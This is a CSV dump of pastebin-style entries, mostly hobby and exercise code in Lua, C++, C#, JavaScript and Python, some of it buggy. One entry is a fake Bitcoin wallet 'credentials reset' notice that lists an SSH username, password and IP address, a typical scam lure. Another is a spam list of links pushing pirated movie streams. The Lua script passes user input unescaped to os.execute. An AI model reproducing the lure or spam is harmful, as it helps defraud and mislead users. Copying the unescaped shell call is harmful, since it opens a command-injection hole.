id,title,username,language,date,content
nGULQMWN,111,MagmaLP,Lua,Sunday 3rd of December 2023 11:44:36 AM CDT,"-- Funktion, um die Datei mit dem Standard-Editor zu öffnen
function openFileInEditor(filename)
    -- Der Befehl kann je nach Betriebssystem variieren
    local os_type = io.popen(""uname""):read(""*l"") -- Lies das Betriebssystem (für Unix-basierte Systeme)
    local command = """"

    -- Befehl zur Dateiöffnung je nach Betriebssystem
    if os_type == ""Windows"" then
        command = ""start "" .. filename -- Der Befehl für Windows
    else
        command = ""open "" .. filename -- Der Befehl für Unix-basierte Systeme (z.B. macOS, Linux)
    end

    -- Ausführen des Befehls in der Konsole
    os.execute(command)
end

-- Benutzereingabe für den Dateinamen
io.write(""Gib den Dateinamen ein, den du öffnen möchtest: "")
local filename = io.read()

-- Aufruf der Funktion, um die Datei zu öffnen
openFileInEditor(1)
"
kZLTM6g5,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Sunday 3rd of December 2023 11:21:19 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be 
chefman440:Jmh3x9ZB on 149.28.231.183
You can connect via SSH.

Regards,
GM-516545"
sjXUPhyD,Untitled,Nanoic,C++,Sunday 3rd of December 2023 11:07:43 AM CDT,"#include <iostream>
using namespace std;

int main()
{
    std::cout << ""Hello World!\n"";
    int n = 0;

    cout << n << endl;

    while (n < 100){       
        
        n++;

        if (n / 2 == 0) {
            n = 3 * n + 1;
            cout << n  << endl;
        }
        else if (n / 2 == 1) {
            
            cout << n  << endl;
            n++;
            
        }
    }

}
"
QjWxz1pL,jquery_dinamic_page,dhiforester,PHP,Sunday 3rd of December 2023 11:06:05 AM CDT,"<!DOCTYPE html>
<html lang=""en"">
    <head>
        <meta charset=""UTF-8"">
        <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
        <title>My Aplication</title>
        <link href=""https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"" rel=""stylesheet"" integrity=""sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN"" crossorigin=""anonymous"">
        <script src=""https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"" integrity=""sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"" crossorigin=""anonymous""></script>
        <link rel=""canonical"" href=""https://getbootstrap.com/docs/5.3/examples/navbar-fixed/"">
        <link rel=""stylesheet"" href=""https://cdn.jsdelivr.net/npm/@docsearch/css@3"">
        <link href=""css/style.css"" rel=""stylesheet"">
    </head>
    <body class=""bg-info"">
        <nav class=""navbar navbar-expand-md navbar-dark fixed-top bg-dark"">
            <div class=""container-fluid"">
                <a class=""navbar-brand"" href="""">My Aplication</a>
                <button class=""navbar-toggler"" type=""button"" data-bs-toggle=""collapse"" data-bs-target=""#navbarCollapse"" aria-controls=""navbarCollapse"" aria-expanded=""false"" aria-label=""Toggle navigation"">
                    <span class=""navbar-toggler-icon""></span>
                </button>
                <div class=""collapse navbar-collapse"" id=""navbarCollapse"">
                    <ul class=""navbar-nav me-auto mb-2 mb-md-0"">
                        <li class=""nav-item"">
                            <a class=""nav-link active"" aria-current=""page"" href="""">Home</a>
                        </li>
                        <li class=""nav-item"">
                            <a class=""nav-link"" href=""javascript:void(0);"" id=""KeHalaman1"">Halaman-1</a>
                        </li>
                        <li class=""nav-item"">
                            <a class=""nav-link"" href=""javascript:void(0);"" id=""KeHalaman2"">Halaman-2</a>
                        </li>
                        <li class=""nav-item"">
                            <a class=""nav-link"" href=""javascript:void(0);"" id=""KeHalaman3"">Halaman-3</a>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>
        <main class=""container"">
            <div class=""bg-body-tertiary p-5 rounded"" id=""MenampilkanHalaman"">
                
            </div>
        </main>
    </body>
</html>"
TG7zg7SG,Count number of hops,jayati,C++,Sunday 3rd of December 2023 11:02:24 AM CDT,"//{ Driver Code Starts
#include <bits/stdc++.h>
using namespace std;

// } Driver Code Ends

class Solution
{
    public:
    //Function to count the number of ways in which frog can reach the top.
    long long countWays(int n)
    {
          int mod = 1000000007;
        long long dp[n+1];
        dp[0] = 1;
        
        for(int i=1;i<n+1;i++) 
            dp[i] = 0;
            
        for(int i=1;i<n+1;i++){
            dp[i] += dp[i-1]%mod;
            
            if(i>1)
                dp[i] += dp[i-2]%mod;
            if(i>2)
                dp[i] += dp[i-3]%mod;
        }
        return dp[n]%mod;
        
    }
};


//{ Driver Code Starts.
int main()
{
    //taking testcases
	int t;
	cin >> t;
	
	while(t--)
	{
	    //taking number of steps in stair
		int n;
		cin>>n;
		Solution ob;
		//calling function countWays()
		cout << ob.countWays(n) << endl;
	}
    
    return 0;
    
}

// } Driver Code Ends"
g3UC2uma,Finding least time for curves,NUCLEARESOL,C#,Sunday 3rd of December 2023 11:00:57 AM CDT,"using System;
using System.Diagnostics;
using System.Threading;
using System.Globalization;

class Program
{

    static void Main()
    {
        int version = 1;
        string type = ""circle"";
        double gravitationalA = 9.81d;
        double[] startPoint = { 5,10};
        double[] endpoint = { 0, 0 };
        const Boolean calculateDistance = false;

        Console.WriteLine(""Following Variables are used:"");
        Console.WriteLine(""Gravitational Accel: "" + gravitationalA + "" m/s"");
        Console.WriteLine(""Goal: "" + endpoint[0] + "","" + endpoint[1]);
        Console.WriteLine(""Start: "" + startPoint[0] + "","" + startPoint[1]);
        Console.WriteLine(""Calculate Distance"" + calculateDistance);
        Console.WriteLine(""y/n"");
        string confirmation = Console.ReadLine();

        if (confirmation != ""y"")
        {
            Console.WriteLine("""");
            Console.WriteLine(""Abort, Please change the variable"");
            Console.WriteLine(""graph type"");
            type = Console.ReadLine();
            Console.WriteLine(""Gravitational Acceleration"");
            gravitationalA = double.Parse(Console.ReadLine(), CultureInfo.InvariantCulture.NumberFormat);
            Console.WriteLine(""Start Point X"");
            startPoint[0] = double.Parse(Console.ReadLine(), CultureInfo.InvariantCulture.NumberFormat);
            Console.WriteLine(""Start Point Y"");
            startPoint[1] = double.Parse(Console.ReadLine(), CultureInfo.InvariantCulture.NumberFormat);
            Console.WriteLine("""");
            Console.WriteLine(""Following Variables are used:"");
            Console.WriteLine(""Gravitational Accel: "" + gravitationalA + "" m/s"");
            Console.WriteLine(""Goal: "" + endpoint[0] + "","" + endpoint[1]);
            Console.WriteLine(""Start: "" + startPoint[0] + "","" + startPoint[1]);
            //Thread.Sleep(3000);
        }

        // Console.WriteLine("""");
        // Console.WriteLine(""Starting calculation"");
        double x = startPoint[0];
        double velX = 0f;
        const double timestep = 0.0001f;
        double time = 0f;
        double initialCollvar = 1;
        double initialCollvarStep = 0.1f;
        double zeroInAccuracy = 0.0001f;
        double maxTime = double.PositiveInfinity;
        double limit = 400;
        string strg = """";
        Console.WriteLine(limit);
        var start = Process.GetCurrentProcess().TotalProcessorTime;
        int i = 0;
        static double NewtonsMethod(double target, double initialGuess, double tolerance, int maxIterations)
        {
            double x = initialGuess;

            for (int i = 0; i < maxIterations; i++)
            {
                double fx = (2 * x - Math.Sin(2 * x)) / (1 - Math.Cos(2 * x));
                double derivative = -2 * ((x / Math.Tan(x)) - 1) * Math.Pow(1 / Math.Sin(x), 2);
                Console.WriteLine(x + "" "" + fx + "" "" + derivative);
                //Thread.Sleep(1000);
                if (Math.Abs(fx - target) < tolerance)
                {
                    Console.WriteLine($""Converged after {i} iterations."");
                    return x;
                }

                x = x - (fx - target) / derivative;
            }

            Console.WriteLine(""Did not converge within the specified number of iterations."");
            return x;
        }

        Tuple<double, double> calculateAcceleration(double X, double collVar, double depvar1, double depvar2)
        {
            double localSlope = 2.0f * collVar * (X - depvar1);

            //Console.WriteLine(-(float)(Math.Cos(Math.Atan(1f / localSlope)) * Math.Sin(Math.Atan(1f / localSlope)) * gravitationalA));
            return Tuple.Create(-(double)(Math.Cos(Math.Atan(1f / localSlope)) * Math.Sin(Math.Atan(1f / localSlope)) * gravitationalA), localSlope);
        }
        Tuple<double, double> calculateAccelerationCircle(double X, double Y, double collVar, double h, double k)
        {
            double localSlope = (h - X) / (Y - k);

            //return -(float)(Math.Cos(Math.Atan(1f / localSlope)) * Math.Sin(Math.Atan(1f / localSlope)) * gravitationalA);
            return Tuple.Create(-(double)(Math.Cos(Math.Atan(1f / localSlope)) * Math.Sin(Math.Atan(1f / localSlope)) * gravitationalA), localSlope);
        }
        Tuple<double, double> calculateAccelerationCubic(double X, double collVar, double h, double k)
        {
            double localSlope = collVar*3.0d*Math.Pow(X-h,2.0);

            //return -(float)(Math.Cos(Math.Atan(1f / localSlope)) * Math.Sin(Math.Atan(1f / localSlope)) * gravitationalA);
            return Tuple.Create(-(double)(Math.Cos(Math.Atan(1f / localSlope)) * Math.Sin(Math.Atan(1f / localSlope)) * gravitationalA), localSlope);
        }

        Console.WriteLine(strg);
        Console.WriteLine("""");
        strg = """";
        Tuple<double, double, double, double> CalculateTimeParabola(double initialCollvar)
        {
            double h = 0;
            double k = 0;
            double distance = 0;
            double deltaX = 0;
            i = i + 1;
            x = startPoint[0];
            velX = 0f;
            time = 0f;
            distance = 0f;
            h = 0.5f * (startPoint[0] - (startPoint[1] / (startPoint[0] * initialCollvar)));
            k = -initialCollvar * (double)Math.Pow(h, 2);
            while (x >= 0 && time < limit)
            {
                Tuple<double, double> calculatedVales = calculateAcceleration(x, initialCollvar, h, k);
                deltaX = (double)(velX * timestep + 0.5f * calculatedVales.Item1 * Math.Pow(timestep, 2));
                x = (double)(x + deltaX);
                velX = velX + (0 + calculateAcceleration(x, initialCollvar, h, k).Item1) * timestep / 1f;
                if (calculateDistance)
                {
                    distance = distance + (double)Math.Sqrt(deltaX * deltaX * (calculatedVales.Item2 * calculatedVales.Item2 + 1.0f));
                }
                time = time + timestep;
            }
            Console.WriteLine(Math.Abs(Math.Abs(initialCollvarStep) * 100 - 100) + "" % complete"");

            return Tuple.Create(time, initialCollvar, h, k);
        }

        Tuple<double, double, double, double> CalculateTimeCircle(double initialCollvar)
        {
            if (initialCollvar < (double)Math.Sqrt(Math.Pow(startPoint[1], 2) + Math.Pow((Math.Pow(startPoint[1], 2) - Math.Pow(startPoint[0], 2)) / (-2 * startPoint[0]), 2)))
            {
                return Tuple.Create(limit, initialCollvar, 0.0d, 0.0d);
            }
            double q = Math.Sqrt(Math.Pow(startPoint[1], 2) + Math.Pow(startPoint[0], 2));
            double x3 = startPoint[0] / 2;
            double y3 = startPoint[1] / 2;


            double h = x3 + (Math.Sqrt(Math.Pow(initialCollvar, 2) - Math.Pow(q / 2, 2)) * (-startPoint[1])) / q;
            double k = y3 + (Math.Sqrt(Math.Pow(initialCollvar, 2) - Math.Pow(q / 2, 2)) * (startPoint[0])) / q;

            double distance = 0;
            double deltaX = 0;

            x = startPoint[0];
            velX = 0f;
            time = 0f;
            distance = 0f;
            double y = k - Math.Sqrt(Math.Pow(initialCollvar, 2) - Math.Pow(x - h, 2));
            while (x >= 0 && time < limit)
            {
                y = k - Math.Sqrt(Math.Pow(initialCollvar, 2) - Math.Pow(x - h, 2));
                Tuple<double, double> calculatedVales = calculateAccelerationCircle(x, y, initialCollvar, h, k);
                deltaX = (double)(velX * timestep + 0.5f * calculatedVales.Item1 * Math.Pow(timestep, 2));
                x = (double)(x + deltaX);
                velX = velX + (0 + calculateAccelerationCircle(x, y, initialCollvar, h, k).Item1) * timestep / 1f;
                if (calculateDistance)
                {
                    distance = distance + (double)Math.Sqrt(deltaX * deltaX * (calculatedVales.Item2 * calculatedVales.Item2 + 1.0f));
                }
                time = time + timestep;
            }

            return Tuple.Create(time, initialCollvar, h, k);
        }
        Tuple<double, double, double, double> CalculateTimeCubic(double initialCollvar)
        {
            double h = 0;
            double k = 0;
            double distance = 0;
            double deltaX = 0;
            i = i + 1;
            x = startPoint[0];
            velX = 0f;
            time = 0f;
            distance = 0f;
            if (initialCollvar <= 0.00001 |initialCollvar >= 12.0 * startPoint[1] / (3.0 * Math.Pow(startPoint[0], 3)))
            {
                return Tuple.Create(limit+100, initialCollvar, h, k);
            }

            h = (3.0d * Math.Pow(startPoint[0], 2) - Math.Sqrt(9.0d * Math.Pow(startPoint[0], 4) - 4.0 * 3.0 * startPoint[0] * (Math.Pow(startPoint[0], 3) - startPoint[1] / initialCollvar)))/2;
            k = initialCollvar * (double)Math.Pow(h, 3);
            while (x >= 0 && time < limit)
            {
                Tuple<double, double> calculatedVales = calculateAccelerationCubic(x, initialCollvar, h, k);
                deltaX = (double)(velX * timestep + 0.5f * calculatedVales.Item1 * Math.Pow(timestep, 2));
                x = (double)(x + deltaX);
                velX = velX + (0 + calculateAccelerationCubic(x, initialCollvar, h, k).Item1) * timestep / 1f;
                if (calculateDistance)
                {
                    distance = distance + (double)Math.Sqrt(deltaX * deltaX * (calculatedVales.Item2 * calculatedVales.Item2 + 1.0f));
                }
                time = time + timestep;
            }
            Console.WriteLine(Math.Abs(Math.Abs(initialCollvarStep) * 100 - 100) + "" % complete"");

            return Tuple.Create(time, initialCollvar, h, k);
        }

        Tuple<double, double, double, double, double, double> jumpingDecend()
        {
            //   Console.WriteLine(Math.Abs(initialCollvarStep)+"",""+zeroInAccuracy);
            double var1 = 0;
            double var2 = 0;
            double var3 = 0;
            double var4 = 0;
            if (type == ""parabola"")
            {
                var1 = 0;
                var2 = 0;
            }
            if (type == ""circle"")
            {
                initialCollvar = (double)Math.Sqrt(Math.Pow(startPoint[1], 2) + Math.Pow((Math.Pow(startPoint[1], 2) - Math.Pow(startPoint[0], 2)) / (-2 * startPoint[0]), 2));
                //  Console.WriteLine(initialCollvar+""RADIUS"");
            }
            if (type == ""cubic"")
            {
                initialCollvar = (12.0 * startPoint[1] / (3.0 * Math.Pow(startPoint[0], 3)))/2;
                initialCollvarStep = (12.0 * startPoint[1] / (3.0 * Math.Pow(startPoint[0], 3))) / 10;
                zeroInAccuracy = (12.0 * startPoint[1] / (3.0 * Math.Pow(startPoint[0], 3))) / 100000;
                Console.WriteLine(initialCollvar+""RADIUS"");
            }

            while (Math.Abs(initialCollvarStep) >= zeroInAccuracy)
            {
                // --  Console.Write(""BOB"");
                initialCollvar = initialCollvar + initialCollvarStep;
                if (type == ""parabola"")
                {
                    time = CalculateTimeParabola(initialCollvar).Item1;
                }
                else if (type == ""circle"")
                {
                    time = CalculateTimeCircle(initialCollvar).Item1;
                }
                else if (type == ""cubic"")
                {
                    time = CalculateTimeCubic(initialCollvar).Item1;
                }
                // Console.WriteLine(distance);
                //  Console.WriteLine(initialCollvar + ""(x-"" + h + "")^2+"" + k);
                strg = strg + ""("" + initialCollvar + "","" + time + "")"" + "","";
                if (maxTime > time)
                {
                    maxTime = time;
                    initialCollvarStep = initialCollvarStep * 2;
                }

                else if (time > maxTime)
                {
                    if (time >= limit)
                    {
                        initialCollvar = initialCollvar - initialCollvarStep;
                        initialCollvarStep = -initialCollvarStep / 4;
                    }
                    else
                    {
                        initialCollvarStep = -initialCollvarStep;
                    }
                }
                else
                {
                    initialCollvarStep = initialCollvarStep / 2;
                }
            }
            if (type == ""circle"")
            {
                Tuple<double, double, double, double> resultcal = CalculateTimeCircle(initialCollvar);
                time = CalculateTimeCircle(initialCollvar).Item1;
                var1 = resultcal.Item1;
                var2 = resultcal.Item3;
                var3 = resultcal.Item4;
            }
            else if (type == ""parabola"")
            {
                Tuple<double, double, double, double> resultcal = CalculateTimeParabola(initialCollvar);
                time = CalculateTimeParabola(initialCollvar).Item1;
                var1 = resultcal.Item2;
                var2 = resultcal.Item3;
                var3 = resultcal.Item4;
            }
            else if (type == ""cubic"")
            {
                Tuple<double, double, double, double> resultcal = CalculateTimeCubic(initialCollvar);
                time = CalculateTimeCubic(initialCollvar).Item1;
                var1 = resultcal.Item2;
                var2 = resultcal.Item3;
                var3 = resultcal.Item4;
            }
            if (time > limit)
            {

                if (type == ""circle"")
                {
                    initialCollvar = initialCollvar - initialCollvarStep / 2;
                    Tuple<double, double, double, double> resultcal = CalculateTimeCircle(initialCollvar);
                    time = resultcal.Item1;
                    var1 = resultcal.Item2;
                    var2 = resultcal.Item3;
                    var3 = resultcal.Item4;
                }
                else if (type == ""parabola"")
                {
                    initialCollvar = initialCollvar - initialCollvarStep / 2;
                    Tuple<double, double, double, double> resultcal = CalculateTimeParabola(initialCollvar);
                    time = resultcal.Item1;
                    var1 = resultcal.Item2;
                    var2 = resultcal.Item3;
                    var3 = resultcal.Item4;
                }
                else if (type == ""cubic"")
                {
                    initialCollvar = initialCollvar - initialCollvarStep / 2;
                    Tuple<double, double, double, double> resultcal = CalculateTimeCubic(initialCollvar);
                    time = resultcal.Item1;
                    var1 = resultcal.Item2;
                    var2 = resultcal.Item3;
                    var3 = resultcal.Item4;
                }
            }
            Console.WriteLine(""Finished"");
            return Tuple.Create(initialCollvar, time, var1, var2, var3, var4);
        }
        Tuple<double, double, double, double, double, double> resultTuple = jumpingDecend();
        var stop = Process.GetCurrentProcess().TotalProcessorTime;

        Console.WriteLine("""");
        Console.WriteLine(""time taken "" + resultTuple.Item2 + "" seconds"");
        Console.WriteLine(""At variable = "" + resultTuple.Item1);
        Console.WriteLine(""h = "" + resultTuple.Item4);
        Console.WriteLine(""k = "" + resultTuple.Item5);
        Console.WriteLine();
        // stopwatch.Stop();
        Console.WriteLine("""");
        Console.WriteLine(""Calculation Time is "" + (stop - start).TotalMilliseconds);
        Console.WriteLine(""Cal amt"" + i);
      //  Console.WriteLine(""Starting control group in 5 seconds"");
        Console.WriteLine(strg);
        Thread.Sleep(20000);
        start = Process.GetCurrentProcess().TotalProcessorTime;
        double theta = NewtonsMethod(startPoint[0] / startPoint[1],1,1e-20,2000);
        double D = 2 * startPoint[1] / (1 - Math.Cos(theta * 2));
        Console.WriteLine(D);
        double t = Math.Sqrt(2*D/gravitationalA)*theta;
        Console.WriteLine(t);
        stop = Process.GetCurrentProcess().TotalProcessorTime;
        Console.WriteLine(""Calculation Time is "" + (stop - start).TotalMilliseconds);
        strg = """";
    }
}"
cGENuuMx,L8 - Source,alaniarati,JavaScript,Sunday 3rd of December 2023 10:54:56 AM CDT,"import axios from ""axios"";
import { useState, useEffect } from ""react"";

const MyComponent = () => {
  // State to store the fetched data
  const [data, setData] = useState([]);

  useEffect(() => {
    // Function to fetch data
    const fetchData = async () => {
      try {
        // Fetching data from JSONPlaceholder using Axios
        const response = await axios.get(
          ""https://jsonplaceholder.typicode.com/posts""
        );
        // Update the state with the fetched data
        setData(response.data);
      } catch (error) {
        console.error(""Error fetching data:"", error);
      }
    };

    // Call the fetchData function
    fetchData();
  }, []); // Empty dependency array ensures this effect runs only once on mount

  return (
    <div>
      <h1>Data from JSONPlaceholder</h1>
      <ul>
        {/* Mapping over the data and rendering each item */}
        {data.map((item) => (
          <li key={item.id}>{item.title}</li>
        ))}
      </ul>
    </div>
  );
};

export default MyComponent;
"
Wb8aN9zQ,Untitled,VolinNilov,C++,Sunday 3rd of December 2023 10:41:55 AM CDT,"#include <iostream>
using namespace std;

class Matrix
{
private:
	int rows, cols;
	int** data;
public:
	Matrix(int r, int c)
	{
		rows = r;
		cols = c;
		data = new int* [rows];
		for (int i = 0; i < rows; i++)
		{
			data[i] = new int[cols];
		}
	}
	void set(int i, int j, int val)
	{
		data[i][j] = val;
	}
	int get(int i, int j)
	{
		return data[i][j];
	}
	Matrix add(Matrix m)
	{
		Matrix result(rows, cols);
		for (int i = 0; i < rows; i++)
		{
			for (int j = 0; j < cols; j++)
			{
				result.set(i, j, data[i][j] + m.get(i, j));
			}
		}
		return result;
	}
	Matrix subtract(Matrix m)
	{
		Matrix result(rows, cols);
		for (int i = 0; i < rows; i++)
		{
			for (int j = 0; j < cols; j++)
			{
				result.set(i, j, data[i][j] - m.get(i, j));
			}
		}
		return result;
	}
	Matrix multiply(Matrix m)
	{
		Matrix result(rows, cols);
		for (int i = 0; i < rows; i++)
		{
			for (int j = 0; j < cols; j++)
			{
				int sum = 0; 
				for (int t = 0; t < cols; t++)
				{
					sum = sum + data[i][t] * m.get(t, j);
				}
				result.set(i, j, sum);
			}
		}
		return result;
	}
};

int main()
{
	Matrix m1(2, 2);
	m1.set(0, 0, 1);
	m1.set(0, 1, 2);
	m1.set(1, 0, 3);
	m1.set(1, 1, 4);

	Matrix m2(2, 2);
	m2.set(0, 0, 5);
	m2.set(0, 1, 6);
	m2.set(1, 0, 7);
	m2.set(1, 1, 8);

	Matrix m3 = m1.add(m2);
	Matrix m4 = m1.subtract(m2);
	Matrix m5 = m1.multiply(m2);

	cout << ""Started matrix: "" << endl;
	cout << ""m1: "" << endl;
	cout << m1.get(0, 0) << "" "" << m1.get(0, 1) << endl;
	cout << m1.get(1, 0) << "" "" << m1.get(1, 1) << endl;
	cout << endl;

	cout << ""m2: "" << endl;
	cout << m2.get(0, 0) << "" "" << m2.get(0, 1) << endl;
	cout << m2.get(1, 0) << "" "" << m2.get(1, 1) << endl;
	cout << endl;

	cout << ""ADD: "" << endl;
	cout << m3.get(0, 0) << "" "" << m3.get(0, 1) << endl;
	cout << m3.get(1, 0) << "" "" << m3.get(1, 1) << endl;
	cout << endl;

	cout << ""SUBTRACT: "" << endl;
	cout << m4.get(0, 0) << "" "" << m4.get(0, 1) << endl;
	cout << m4.get(1, 0) << "" "" << m4.get(1, 1) << endl;
	cout << endl;
	
	cout << ""MULTIPLY: "" << endl;
	cout << m5.get(0, 0) << "" "" << m5.get(0, 1) << endl;
	cout << m5.get(1, 0) << "" "" << m5.get(1, 1) << endl;
	cout << endl;

	return 0;
}"
0962EEQC,segseh,gadungw71,PHP,Sunday 3rd of December 2023 10:30:21 AM CDT,"<a href=""https://bio.link/teeyodfullhdthai4k"">https://bio.link/teeyodfullhdthai4k</a>

<a href=""https://bio.link/filmteeyodhdfullthai"">https://bio.link/filmteeyodhdfullthai</a>

<a href=""https://bio.link/teeyodfullhd1080p"">https://bio.link/teeyodfullhd1080p</a>

<a href=""https://bio.link/edezx"">https://bio.link/edezx</a>

<a href=""https://bio.link/awertyty"">https://bio.link/awertyty</a>

<a href=""https://bio.link/wonkafullhdthai4k"">https://bio.link/wonkafullhdthai4k</a>

<a href=""https://bio.link/wonkathai"">https://bio.link/wonkathai</a>

<a href=""https://bio.link/wonkathaisubhd4k"">https://bio.link/wonkathaisubhd4k</a>

<a href=""https://bio.link/wonkahdthai1080"">https://bio.link/wonkahdthai1080</a>

<a href=""https://groups.google.com/g/comp.arch.fpga/c/b_cqYrxYltU"">https://groups.google.com/g/comp.arch.fpga/c/b_cqYrxYltU</a>

<a href=""https://groups.google.com/g/comp.text.tex/c/S-lOaxWdrdk"">https://groups.google.com/g/comp.text.tex/c/S-lOaxWdrdk</a>

<a href=""https://groups.google.com/g/comp.text.tex/c/Fl_9Pq3VfoY"">https://groups.google.com/g/comp.text.tex/c/Fl_9Pq3VfoY</a>

<a href=""https://groups.google.com/g/comp.arch.fpga/c/X4CoyiyIj3M"">https://groups.google.com/g/comp.arch.fpga/c/X4CoyiyIj3M</a>

<a href=""https://groups.google.com/g/mozilla.dev.platform/c/WXO0D5RjcEc"">https://groups.google.com/g/mozilla.dev.platform/c/WXO0D5RjcEc</a>

<a href=""https://baskadia.com/post/1aupf"">https://baskadia.com/post/1aupf</a>

<a href=""https://baskadia.com/post/1av2x"">https://baskadia.com/post/1av2x</a>

<a href=""https://hackmd.io/@rerewilli6/ByG8YQcBp"">https://hackmd.io/@rerewilli6/ByG8YQcBp</a>

<a href=""https://rentry.co/79mghw"">https://rentry.co/79mghw</a>

<a href=""https://pastelink.net/waf923co"">https://pastelink.net/waf923co</a>

<a href=""https://snippet.host/kgroib"">https://snippet.host/kgroib</a>

<a href=""https://glot.io/snippets/gr69igc3m4"">https://glot.io/snippets/gr69igc3m4</a>

<a href=""https://etextpad.com/uogi7tahg1"">https://etextpad.com/uogi7tahg1</a>

<a href=""https://homment.com/yy4nyofKDo03pTQkRyS4"">https://homment.com/yy4nyofKDo03pTQkRyS4</a>

<a href=""https://jsbin.com/honoqedute/edit?html,output"">https://jsbin.com/honoqedute/edit?html,output</a>
"
L4M8bt4W,Untitled,Farz0l1x,Python,Sunday 3rd of December 2023 10:22:26 AM CDT,"file = open('17_11887.txt')
A = list(map(int, file.readlines()))
count = 0
for i in range(len(A) + 3):
    B = []
    B += [A[i]]
    B += [A[i-1]]
    B += [A[i-2]]
    B += [A[i-3]]
    B = B.sort()
    if (B[0] // 10 < 10 and B[1] // 10 >= 10) or (B[0] // 10 < 10 and B[3] // 10 < 10):
        count += 1
print(count)  "
